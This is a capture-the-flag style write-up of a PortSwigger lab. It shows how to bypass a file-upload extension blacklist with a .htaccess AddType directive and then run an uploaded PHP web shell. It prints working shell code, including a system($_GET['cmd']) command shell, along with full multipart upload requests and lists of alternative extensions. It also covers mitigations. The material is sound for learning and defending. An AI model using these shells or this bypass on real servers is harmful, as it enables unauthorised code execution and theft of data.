# 📘 PortSwigger Lab: Web shell upload via extension blacklist bypass

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass  
> 🎯 Topic: Unrestricted File Upload — bypassing an extension blacklist via .htaccess  
> 🧪 Difficulty: Practitioner  
> ✅ Status: Solved  

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🦠 The Problem with Extension Blacklists](#blacklist)
- [⚙️ What Is .htaccess and Why It Is Critical](#htaccess)
- [🐚 Web Shell](#webshell)
- [⚡ The Exploit Payload](#exploit)
- [🔍 Step 1 — Recon the Upload Function and Serving Path](#step1)
- [🔍 Step 2 — Attempt exploit.php and Map the Filter](#step2)
- [🔍 Step 3 — Identify the Web Server via Response Headers](#step3)
- [🔍 Step 4 — Upload the Malicious .htaccess](#step4)
- [🔍 Step 5 — Upload the Shell as .l33t](#step5)
- [🔍 Step 6 — Execute the Shell and Retrieve the Secret](#step6)
- [📨 Example Requests](#requests)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [🧪 Additional Tests](#additional-tests)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Bypass the extension blacklist to:

```text
1. Upload a PHP web shell under an extension that is not in the blacklist.
2. Execute the shell via a GET request to the uploaded file.
3. Exfiltrate the contents of /home/carlos/secret and submit it as the solution.
```

Test user credentials:

```text
wiener:peter
```

Lab hint:

```text
You need to upload two different files to solve this lab.
```

---

<a id="theory"></a>

## 🧠 Short Theory

An extension blacklist blocks "dangerous" file suffixes:

```text
blocked:   .php
allowed:   everything else
```

The fundamental flaw of a blacklist: **there are far more dangerous extensions than `.php`**, and with Apache there is a way to **add a new execution rule from inside the upload directory itself**.

`.htaccess` is an Apache configuration file that applies **to its directory and below**. If the upload directory allows configuration overrides, an uploaded `.htaccess` changes server behavior for every file nearby — for example, mapping an arbitrary extension to the PHP interpreter:

```apache
AddType application/x-httpd-php .l33t
```

After that, `exploit.l33t` executes exactly like `exploit.php` — the extension is not in the blacklist because it **did not exist** before the attack.

---

<a id="idea"></a>

## 🧩 Core Idea

Instead of hunting for an "uncovered" extension in the blacklist (the обходной path), the attacker **rewrites the server's rules**:

```text
File 1 (.htaccess):    "from now on, the .l33t extension means PHP"
File 2 (exploit.l33t): the shell itself, under an extension absent from the blacklist
```

A blacklist cannot block an extension it has never heard of. And the attacker invents one — `.l33t` is simply an arbitrary string.

---

<a id="blacklist"></a>

## 🦠 The Problem with Extension Blacklists

A blacklist is inherently behind reality:

```text
The developer lists:   .php, .php5, .phtml ...
The attacker uses:     .l33t (invented today)
```

Comparison of approaches:

```text
Blacklist  → blocks known-bad, everything else passes
Whitelist  → allows known-good, everything else is blocked
```

For executable files a blacklist is fundamentally weak: the set of dangerous variants is open (`.php`, `.php3`–`.php8`, `.phtml`, `.phps`, `.phar`, custom ones via configuration), and for Apache the `.htaccess` vector cannot be enumerated at all.

---

<a id="htaccess"></a>

## ⚙️ What Is .htaccess and Why It Is Critical

`.htaccess` is Apache's distributed configuration. On every request, Apache reads the `.htaccess` in the requested file's directory and applies its directives.

The directive used in the lab:

```apache
AddType application/x-httpd-php .l33t
```

Breakdown:

```text
AddType — maps a file extension to a MIME type
application/x-httpd-php — the type handled by the mod_php module
.l33t — an arbitrary extension assigned by the attacker
```

Since the server runs mod_php, it already "knows" how to handle this type — `.l33t` files execute as PHP.

Criticality: `.htaccess` turns a **file upload function** into a **server configuration change function**. This is an escalation from "upload any file" to "control web server behavior".

---

<a id="webshell"></a>

## 🐚 Web Shell

Minimal PHP shell for reading the target file:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Universal variant:

```php
<?php echo system($_GET['cmd']); ?>
```

---

<a id="exploit"></a>

## ⚡ The Exploit Payload

Two files:

### File 1 — .htaccess

```apache
AddType application/x-httpd-php .l33t
```

Content-Type in the multipart request:

```text
Content-Type: text/plain
```

### File 2 — exploit.l33t

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

<a id="step1"></a>

## 🔍 Step 1 — Recon the Upload Function and Serving Path

1. Log in as `wiener:peter`.
2. Upload a normal image as the avatar.
3. Return to the account page.
4. In Burp → Proxy → HTTP history, find the avatar-serving request:

```http
GET /files/avatars/<YOUR-IMAGE> HTTP/1.1
```

and send it to Repeater.

---

<a id="step2"></a>

## 🔍 Step 2 — Attempt exploit.php and Map the Filter

1. Create a local `exploit.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. Attempt to upload it as the avatar. The server responds:

```text
You are not allowed to upload files with a .php extension
```

Filter mapping:

```text
Mechanism:        an extension blacklist
Known block:      .php
Unknown:          which other extensions are listed, whether content is checked
```

---

<a id="step3"></a>

## 🔍 Step 3 — Identify the Web Server via Response Headers

In HTTP history, open the response to `POST /my-account/avatar` and inspect the headers:

```http
Server: Apache
```

The server is **Apache**. This is the key reconnaissance: the `.htaccess` vector applies. Send the POST request to Repeater.

General practice: `Server`, `X-Powered-By`, and similar headers identify the stack — and the stack determines the technique (for nginx the vector would be `.user.ini`, for IIS its own specifics).

---

<a id="step4"></a>

## 🔍 Step 4 — Upload the Malicious .htaccess

In Repeater, in POST /my-account/avatar, modify the file part:

```text
filename="exploit.php"    →  filename=".htaccess"
Content-Type: ...         →  Content-Type: text/plain
File body                 →  AddType application/x-httpd-php .l33t
```

Send. Response:

```text
The file avatars/.htaccess has been uploaded.
```

The upload directory's configuration is rewritten: `.l33t` now executes as PHP.

---

<a id="step5"></a>

## 🔍 Step 5 — Upload the Shell as .l33t

1. Use the back arrow in Repeater to return to the original PHP upload request.
2. Change only the filename:

```text
filename="exploit.php"  →  filename="exploit.l33t"
```

3. Send. Response:

```text
The file avatars/exploit.l33t has been uploaded.
```

`.l33t` is absent from the blacklist — the upload passes. The body remains the PHP shell.

---

<a id="step6"></a>

## 🔍 Step 6 — Execute the Shell and Retrieve the Secret

In the Repeater tab with the avatar-serving request, replace the filename:

```http
GET /files/avatars/exploit.l33t HTTP/1.1
```

Send. Thanks to the malicious `.htaccess`, the server executes `.l33t` as PHP, and the response contains the secret:

```text
SECRET-VALUE-HERE
```

Submit the secret via the button in the lab banner.

The lab is marked:

```text
Solved
```

---

<a id="requests"></a>

## 📨 Example Requests

### Recon: avatar serving

```http
GET /files/avatars/avatar.png HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

### Blocked upload (baseline)

```http
POST /my-account/avatar HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=--------------------

--------------------
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
--------------------
Content-Disposition: form-data; name="user"

wiener
--------------------
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
--------------------
```

Response:

```text
You are not allowed to upload files with a .php extension
```

### Working upload 1 — malicious .htaccess

```http
POST /my-account/avatar HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=--------------------

--------------------
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
--------------------
Content-Disposition: form-data; name="user"

wiener
--------------------
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
--------------------
```

### Working upload 2 — the shell as .l33t

```http
POST /my-account/avatar HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=--------------------

--------------------
Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
--------------------
Content-Disposition: form-data; name="user"

wiener
--------------------
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
--------------------
```

### Request to the shell

```http
GET /files/avatars/exploit.l33t HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

---

<a id="response"></a>

## 📥 Example Result

### .htaccess upload response

```text
The file avatars/.htaccess has been uploaded.
```

### exploit.l33t upload response

```text
The file avatars/exploit.l33t has been uploaded.
```

### Shell response

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

SECRET-VALUE-HERE
```

Lab status:

```text
Solved
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Log in as wiener:peter
2. Upload a test image, find GET /files/avatars/ in history
3. Attempt to upload exploit.php → blocked by extension
4. Identify the server as Apache via response headers
5. Upload .htaccess with AddType application/x-httpd-php .l33t
6. Upload exploit.l33t with the same PHP body — extension outside the blacklist
7. GET /files/avatars/exploit.l33t → Apache executes it as PHP
8. The secret is retrieved and submitted — the lab is Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

### 1. A Blacklist Cannot Enumerate What Has Not Been Invented

`.l33t` is an extension that did not exist before the attack. No blacklist contains it, because you can only enumerate the known.

### 2. The Upload Function Rewrites Server Configuration

`.htaccess` in the upload directory + allowed configuration overrides = the attacker changes execution rules **from inside** the defended zone. This is an architectural error, not just a "bad list".

### 3. The Filter Checks Only the Filename

The Content-Type, the content, and multiple files are not validated — the `.htaccess` upload went through without obstacles.

### 4. Stack Reconnaissance Determined the Technique

The `Server: Apache` header pointed directly at the `.htaccess` vector. Without identifying the stack, the attacker could waste time on inapplicable techniques.

### 5. mod_php Interprets the Assigned Type

`application/x-httpd-php` is a "native" type for mod_php; no extra configuration is needed — the `AddType` directive immediately enables execution.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

The workflow when facing an extension blacklist:

```text
1. Map the list: try .php, .php5, .phtml, .phar — what is blocked?
2. Identify the stack: Server / X-Powered-By / behavioral signs
   (Apache → .htaccess, nginx → .user.ini, IIS → its own specifics)
3. Look for "configuration" files: if the upload accepts
   .htaccess / .user.ini / web.config — that is an escalation to server control
4. Invent your own extension: a blacklist cannot block
   what does not exist yet
```

Alternative extensions to probe (when the .htaccess vector is unavailable):

```text
.php5  .php7  .phtml  .phar  .phps  .pht
```

---

<a id="additional-tests"></a>

## 🧪 Additional Tests

Within an authorized lab, the following can be compared:

### Universal shell

```php
<?php echo system($_GET['cmd']); ?>
```

```text
GET /files/avatars/exploit.l33t?cmd=whoami
GET /files/avatars/exploit.l33t?cmd=ls+/home/carlos
```

### Other invented extensions

```text
AddType application/x-httpd-php .backdoor
AddType application/x-httpd-php .config
```

### Blacklist mapping

```text
exploit.php5   → blocked or not?
exploit.phtml  → blocked or not?
exploit.txt    → uploads (but does not execute)
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Not Identifying the Server Before Choosing a Technique

Without `Server: Apache`, the `.htaccess` vector does not come to mind — the attacker instead burns time enumerating extensions.

### Mistake 2. Forgetting to Change the Content-Type for .htaccess

The official solution sets `Content-Type: text/plain` for `.htaccess`. Leaving the PHP MIME may cause the filter (or server) to behave unexpectedly.

### Mistake 3. Leaving PHP Code in the .htaccess Body

The body must contain the **directive**, not `<?php ... ?>`. If the content is not replaced, the configuration is not rewritten.

### Mistake 4. Uploading exploit.l33t Before .htaccess

Order is critical: first the rule, then the file. Without `.htaccess`, `.l33t` is not mapped to PHP — the file will be stored but served as text.

### Mistake 5. Brute-Forcing Extensions Instead of Using .htaccess

Probing `.php5`/`.phtml` can stall — in this lab the blacklist appears broad. The configuration vector is more reliable and faster.

### Mistake 6. Not Using the "Back" Arrow in Repeater

A convenient workflow: edits are made in the same POST request (`.htaccess` → roll back → `exploit.l33t`) rather than recreated from scratch.

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Extension Whitelist Instead of Blacklist

Allow only `jpg`, `jpeg`, `png`, `webp` — reject everything else, including unknown extensions.

### 2. Forbid .htaccess in Upload Directories

At the Apache configuration level:

```apache
<Directory /files/avatars/>
    AllowOverride None
</Directory>
```

Better still — forbid uploading any dotfiles entirely.

### 3. Random File Names

A server-generated name (UUID) rules out storing `.htaccess` under the required name and predictable paths.

### 4. Store Outside the Web Root

Serve files through a dedicated endpoint from a directory with neither execution nor `.htaccess` handling.

### 5. Content Validation

Magic bytes + image reprocessing, regardless of name and MIME.

### 6. Minimize Stack Disclosure

Remove `Server` / `X-Powered-By` — it reduces hints for choosing a bypass technique (not a security boundary, but less recon noise).

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Logged in as wiener:peter
- [ ] Uploaded a test image
- [ ] Found `GET /files/avatars/<image>` in HTTP history
- [ ] Sent the GET request to Repeater

### Filter Mapping

- [ ] The `exploit.php` upload was blocked (.php is blacklisted)
- [ ] Response headers reveal `Server: Apache`
- [ ] POST request sent to Repeater

### Exploitation

- [ ] Uploaded `.htaccess` with `AddType application/x-httpd-php .l33t` (Content-Type: text/plain)
- [ ] Uploaded `exploit.l33t` with the PHP body
- [ ] `GET /files/avatars/exploit.l33t` returns the secret
- [ ] Secret submitted
- [ ] Lab status: Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The lab was solved through a **two-stage extension blacklist bypass**:

```text
1. Uploaded .htaccess: "the .l33t extension now executes as PHP"
2. Uploaded exploit.l33t — an extension outside the blacklist
3. Apache executes the shell → the secret is read
```

Main lessons:

```text
An extension blacklist is fundamentally weak: the set of dangerous variants is open.
```

```text
.htaccess turns a file upload into a server configuration change — an architectural-level escalation.
```

```text
Stack identification (Server: Apache) is a mandatory recon step; it determines the bypass technique.
```

```text
The only reliable defense is a whitelist + a ban on configuration files + storage outside executable directories.
```

---

[⬆ Back to top](#top)
